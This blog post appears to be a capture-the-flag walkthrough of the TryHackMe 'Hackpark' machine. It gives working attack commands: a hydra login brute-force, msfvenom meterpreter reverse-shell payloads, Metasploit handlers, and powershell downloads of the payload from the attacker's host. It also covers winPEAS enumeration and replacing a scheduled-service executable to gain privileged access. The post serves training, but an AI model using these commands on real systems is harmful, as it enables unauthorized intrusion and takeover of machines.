---
layout: post
permalink: /posts/thm/hackpark
title: "Hackpark"
---

Visit the web site

![website](/assets/images/thm/hackpark/website.png)

Go to the login form http://10.10.82.116/Account/login.aspx?ReturnURL=/admin/ fill random credentials and catch the request with Burp

![burp](/assets/images/thm/hackpark/burp.png)

URL = /Account/login.aspx <br />
Credentials: Coppy the whole string and replace “admin” with ^USER^ and sa with ^PASS^ <br />
Error = Login failed <br />

```
hydra 10.10.82.116 http-form-post "/Account/login.aspx:__VIEWSTATE=nqEgMQZDJA4ljVpOVjx4YPCakVF3d9nvoxg%2BUiLKw0H7p8yiCYZA4FKfhR%2FCcXy3aqwWPNHT1YS%2ByGJ5SofTN5qk8awWYo6EGr6ojt%2FsxQoJEaadulKPmU3MFDceLDzAiK27vjp8GXtc0ARml9xvG9AxEmTvg%2Bv0b6Jm8sHjwUpPqMjGSvawaV%2FE%2FGdLrsFyzlTVwQtoZJ19lPqU1XMAkjIBepprEtPWINwp62TsJyAiJrNiyQKD8jjUTckHgWA%2F8A3iKqRKLpucOURl98yflXTy4ZNX%2Bm9nd37efgiC1V5ZvmOdSiTecrNlobL3KJTEJEnRgN8ffjmC1zT9BGmOr%2FbjsHGxHakJmjkunMp9kLHDO3e1&__EVENTVALIDATION=FBbJgg%2Fj3CURj021ldkMQH4rERL%2BUHa4w0WMXZ8uNg3UXN0crSNW593k%2BrctSyHsw6UzOyTppeuzC3QU6%2FZB64bT%2FNovRwxM743JTc5hO2Iru%2BoZjdEYpqN8%2BHOrECQZrEmC9VcLtEblSn86sNLvjl0kipFtxT5DM%2FdE%2BhO48aRsMr9C&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed" -l admin -P Hacking/Lists/rockyou.txt -t 10 -w 30
```

![hydra](/assets/images/thm/hackpark/hydra.png)

We have successfully logged in

![admin](/assets/images/thm/hackpark/admin.png)

On the left side there is menu, navigate to “About” to find additional information about the service.

![version](/assets/images/thm/hackpark/version.png)

Search in exploit db to find exploit

![exploit](/assets/images/thm/hackpark/exploit.png)

Download the exploit and change to your ip <br />

Go to /admin/app/editor/editpost.cshtml and open the File Manager

![editpost](/assets/images/thm/hackpark/editpost.png)

Upload the script

![upload](/assets/images/thm/hackpark/upload.png)

Start listener <br />

navigate to /?theme=../../App_Data/files

![website2](/assets/images/thm/hackpark/website2.png)

![shell](/assets/images/thm/hackpark/shell.png)

Our netcat session is unstable, so let's generate another reverse shell using msfvenom.

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.5.60 LPORT=4444 -f exe -o shells.exe
```

Start listener on metasploit

```
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST 
set LPORT 
run
```

Start Python server and download the exe file on the target machine.

![python](/assets/images/thm/hackpark/python.png)

```
cd C:\Windows\Temp
powershell -c wget "http://10.9.5.60:9000/shells.exe" -outfile "shells.exe"
```

![exe](/assets/images/thm/hackpark/exe.png)

```
shells.exe
```

Now we have a mterpreter shell

![meterpreter](/assets/images/thm/hackpark/meterpreter.png)

We are going to use winPEAS to escalate privileges

![winpeas](/assets/images/thm/hackpark/winpeas.png)

in meterpreter session execute 

```
upload winPEASx64.exe 
shell
winPEASx64.exe serviceinfor
````

What is the name of the abnormal service running?

![service](/assets/images/thm/hackpark/service.png)

![message](/assets/images/thm/hackpark/message.png)

The WindowsScheduler service runs Message.exe periodically with root privilege. So we can obtain root by replacing Message.exe with an executable of our choice to spawn a reverse shell. <br />

Now we are going to generate our own Message.exe executable with msfvenom, making sure a different lport is used.

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.5.60 LPORT=1234 -f exe -o Message.exe
```

Start listener on metasploit

```
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST your-ip 
set LPORT listening-port 
run
```

In the previous meterpreter, upload our Message.exe into the correct dir on the target machine.

```
cd “C:\Program Files (x86)\SystemScheduler>”
```

NOTICE! File could be being use at this moment, so try again until it's copied.

```
powershell -c wget "http://10.9.5.60:9000/Message.exe" -outfile "Message.exe"
```

![flags](/assets/images/thm/hackpark/flags.png)

```
shell 
systeminfo
```

![sysinfo](/assets/images/thm/hackpark/sysinfo.png)